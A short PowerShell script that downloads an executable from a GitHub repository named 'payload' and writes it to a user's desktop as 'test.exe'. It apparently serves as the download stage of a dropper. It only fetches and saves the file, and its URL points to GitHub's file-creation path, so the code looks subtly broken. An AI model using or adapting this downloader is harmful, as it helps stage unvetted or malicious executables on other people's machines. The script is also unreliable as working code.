# Set the source and destination
$source = 'https://github.com/myansen039/payload/new/main/main.exe'
$destination = 'C:\Users\user\desktop\test.exe'
 
# Create the HTTP client download request
$httpClient = New-Object System.Net.Http.HttpClient
$response = $httpClient.GetAsync($source)
$response.Wait()
 
# Create a file stream to pointed to the output file destination
$outputFileStream = [System.IO.FileStream]::new($destination, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
 
# Stream the download to the destination file stream
$downloadTask = $response.Result.Content.CopyToAsync($outputFileStream)
$downloadTask.Wait()
 
# Close the file stream
$outputFileStream.Close()
